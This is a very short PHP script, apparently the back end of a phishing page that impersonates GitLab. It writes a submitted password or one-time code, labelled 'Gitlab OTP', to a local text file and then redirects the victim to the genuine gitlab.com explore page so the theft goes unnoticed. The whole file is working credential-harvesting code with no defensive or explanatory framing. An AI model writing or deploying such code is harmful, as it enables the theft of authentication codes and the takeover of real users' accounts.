<?php
file_put_contents("otp.txt", "Gitlab OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://gitlab.com/explore');
?>
